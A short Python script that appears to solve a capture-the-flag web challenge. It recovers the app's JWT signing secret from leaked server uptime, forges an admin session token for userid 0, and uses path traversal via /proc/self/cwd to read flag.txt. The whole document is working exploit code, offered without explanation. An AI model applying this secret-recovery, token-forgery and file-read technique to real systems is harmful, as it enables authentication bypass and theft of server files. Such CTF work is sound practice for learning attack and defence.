import jwt, requests, time, hashlib


### CONSTANTS ###
URL = "https://random.chal.cyberjousting.com/"


### GET APP_SECRET ###
resp = requests.request("GET", URL+"/api/files", headers={'Cookie': 'session=wrong'})
uptime = int(resp.text.split(' ')[8])
current_time = int(time.time())
original_time = current_time - uptime
APP_SECRET = hashlib.sha256(str(original_time).encode()).hexdigest()
session_cookie = jwt.encode({"userid": 0}, APP_SECRET, algorithm="HS256")


### GET FLAG ###
print(requests.request("GET", URL+"/api/file?filename=/proc/self/cwd/flag.txt", headers={'Cookie': f'session={session_cookie}'}).text)